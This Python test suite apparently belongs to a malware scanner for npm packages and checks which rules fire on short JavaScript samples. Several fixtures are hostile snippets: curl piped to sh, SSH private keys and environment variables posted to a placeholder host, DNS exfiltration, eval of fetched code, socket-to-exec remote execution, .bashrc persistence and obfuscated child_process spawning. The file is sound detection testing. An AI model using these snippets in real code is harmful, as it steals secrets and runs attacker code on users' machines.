import base64

from conftest import rules_of

from sniffdog.analyzers.javascript import analyze_js_source
from sniffdog.models import Severity


def scan(src, install=False, imp=True):
    return analyze_js_source(src, "index.js", install_time=install, import_time=imp)


def test_process_env_to_https_request_write():
    src = "const https=require('https');const r=https.request({host:'x'});r.write(JSON.stringify(process.env));r.end();"
    f = [x for x in scan(src, install=True) if x.rule_id == "JS-EXFIL"]
    assert f and f[0].severity == Severity.CRITICAL


def test_destructured_require_alias():
    src = "const { exec: run } = require('child_process');\nrun('curl -s https://x.invalid/s | sh');"
    assert "JS-SHELL-DOWNLOAD" in rules_of(scan(src))


def test_esm_imports_and_ssh_key():
    src = (
        "import fs from 'fs'; import os from 'os'; import fetch from 'node-fetch';\n"
        "const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');\n"
        "fetch('https://x.invalid', {method: 'POST', body: k});"
    )
    assert "JS-EXFIL" in rules_of(scan(src), Severity.HIGH)


def test_callback_params_inherit_remote_taint():
    src = "const https=require('https');https.get('https://x.invalid',res=>{let b='';res.on('data',d=>b+=d);res.on('end',()=>eval(b));});"
    assert "JS-EXEC-REMOTE" in rules_of(scan(src))


def test_base64_to_function_constructor():
    payload = base64.b64encode(b"console.log(1)").decode()
    assert "JS-EXEC-OBFUSCATED" in rules_of(scan(f"new Function(Buffer.from('{payload}', 'base64').toString())();"))


def test_dns_exfil():
    src = "const dns=require('dns'),os=require('os');dns.resolve(os.hostname()+'.x.invalid',()=>{});"
    assert "JS-EXFIL-DNS" in rules_of(scan(src))


def test_function_return_summary():
    src = "const os=require('os'),axios=require('axios');function info(){return {u: os.userInfo(), e: process.env};}\naxios.post('https://x.invalid', info());"
    assert "JS-EXFIL" in rules_of(scan(src), Severity.HIGH)


def test_persistence_append_bashrc():
    src = "const fs=require('fs');fs.appendFileSync(require('os').homedir()+'/.bashrc','x');"
    assert "JS-PERSISTENCE" in rules_of(scan(src))


def test_local_function_named_request_is_not_a_sink():
    src = "function request(x){return x}\nrequest(JSON.stringify(process.env));"
    assert "JS-EXFIL" not in rules_of(scan(src))


def test_spawn_with_env_option_is_benign():
    src = "const {spawn}=require('child_process');spawn('node',['build.js'],{env: process.env, stdio:'inherit'});"
    assert not rules_of(scan(src), Severity.LOW)


def test_buffer_tostring_is_not_decoding():
    src = "const {execSync}=require('child_process');const out=Buffer.from(execSync('git rev-parse HEAD')).toString();execSync('git show '+out);"
    assert "JS-SHELL-OBFUSCATED" not in rules_of(scan(src))


def test_settimeout_with_function_is_ignored():
    assert not scan("setTimeout(() => console.log(String.fromCharCode(72)), 10);")


# ---------------------------------------------------------------- regressions from scanning top npm packages


def test_fromcharcode_in_lexer_is_not_decoding():
    src = "function next(c){ return String.fromCharCode(c); }\nconst t = next(65);\nconst fns = {};\nfns[t](t);\neval(t);"
    assert "JS-EXEC-OBFUSCATED" not in rules_of(scan(src))


def test_fromcharcode_wall_is_decoding():
    src = "eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103));"
    assert "JS-EXEC-OBFUSCATED" in rules_of(scan(src))


def test_split_string_require_is_flagged():
    src = "require('chi'+'ld_pro'+'cess')['sp'+'awn']('rund'+'ll32', ['x.dll,main']);"
    rules = rules_of(scan(src))
    assert {"JS-OBFUSCATED-REQUIRE", "JS-LOLBIN"} <= rules


def test_parameter_binding_through_local_function():
    src = (
        "const net=require('net'),os=require('os');\nfunction send(a){const s=new net.Socket();s.connect(1,'h',()=>{s.write(a)});}\n"
        "send(JSON.stringify({h: os.hostname(), u: os.userInfo()}));"
    )
    assert "JS-EXFIL" in rules_of(scan(src, install=True), Severity.HIGH)


def test_socket_data_to_exec_is_remote_code_execution():
    src = "const net=require('net'),{exec}=require('child_process');const c=net.connect(4444,'h');c.on('data',d=>exec(d.toString()));"
    assert "JS-SHELL-OBFUSCATED" in rules_of(scan(src))


def test_module_constructor_is_medium_outside_install():
    f = [x for x in scan("const m = new module.constructor(); m._compile(src, 'x.js');") if x.rule_id == "JS-MODULE-COMPILE"]
    assert f and f[0].severity == Severity.MEDIUM


def test_data_driven_dispatch_is_not_obfuscation():
    src = "const m = JSON.parse(Buffer.from(msg, 'base64').toString());\nhandlers[m.type](m.payload);"
    assert "JS-EXEC-OBFUSCATED" not in rules_of(scan(src))


def test_decoder_call_in_index_is_obfuscation():
    src = "function e(r){return Buffer.from(r,'hex').toString()}\nconst a = e('6869');\nconst f = new module.constructor();\nf[e('5f636f6d70696c65')](a, '');"
    assert "JS-EXEC-OBFUSCATED" in rules_of(scan(src))


def test_bundle_mode_caps_severity():
    from sniffdog.analyzers.javascript import JSFileAnalysis

    src = "const https=require('https');const r=https.request({});r.write(JSON.stringify(process.env));\n"
    a = JSFileAnalysis(src.encode(), "dist/bundle.js", False, True, bundle_mode=True)
    a.run()
    f = [x for x in a.findings if x.rule_id == "JS-EXFIL"]
    assert f and f[0].severity == Severity.MEDIUM and f[0].evidence["bundle_mode"]


def test_process_global_is_never_tainted():
    src = "process.stdout.write(Buffer.from(x, 'base64'));\nconst {spawn}=require('child_process');spawn(process.env.SHELL || 'sh', ['-c', 'ls']);"
    assert "JS-SHELL-OBFUSCATED" not in rules_of(scan(src))
